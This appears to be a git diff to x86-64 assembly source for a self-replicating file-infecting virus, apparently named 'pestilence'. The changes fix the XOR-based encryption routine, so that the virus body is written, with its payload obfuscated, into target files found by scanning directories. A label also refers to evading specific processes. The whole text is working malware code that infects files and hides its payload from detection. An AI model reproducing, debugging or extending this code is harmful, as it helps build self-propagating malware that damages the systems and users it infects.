@@ -94,6 +94,7 @@
 
 ; r15 + 1524	; self fd
 ; r15 + 1530	; is_encrypted buffer
+; r15 + 1538	; encryption buffer
 global _start
 
 section .text
@@ -152,6 +153,7 @@ _decypher:
 	mov rax, -1 ;i = -1
 	mov rdx, pestilence - _payload
 	xor r9, r9
+	mov r10, 42
 	call .get_rip
 	.get_rip:
 		pop rbp
@@ -159,9 +161,8 @@ _decypher:
 	.loop:
 		inc rax
 		lea rsi, [rbp + _payload] ; (rbp + (payload - start ) )
-		add rsi, rax
 		; add rsi, _evade_specific_process - _start
-		xor byte [rsi], 42
+		xor byte [rsi + rax], 42
 		cmp rax, rdx
 		jle .loop
 	nop
@@ -636,30 +637,29 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			.delta:
 				pop rbp
 				sub rbp, .delta
-			imul rax, rax, 1
-
 		_append_virus:
 			xor r8, r8 ; i = 0
 			mov r9, _stop - _start ; virus length
 			mov rdi, [r15 + 1420]  ; fd
 			; mov byte r8, [rbp + _start] ; buffer to cypher
-			lea rsi, [rbp + _start]		; memory to write
 
 			.loop:
-				mov rdx, 1
 				lea rsi, [rbp + _start + r8]
-				; if r8 > _payload - _start && r8 < pestilence - _start
+				mov rdx, 1
 				cmp r8, _payload - _start
 				jl .nocypher
 				.cypher:
 					cmp r8, pestilence - _start
 					jge .nocypher
-					xor byte rsi, 42
+					xor r10,r10
+					mov r10b, byte [rsi]
+					xor r10b, 42
+					mov byte [r15 + 1538], r10b
+					lea rsi, [r15 + 1538]
 				.nocypher:
 				; mov byte r8, [rbp + _start + rcx]
 				mov rax, SYS_WRITE
 				syscall
-				inc rsi
 				inc r8
 				cmp r8, r9
 				jl .loop
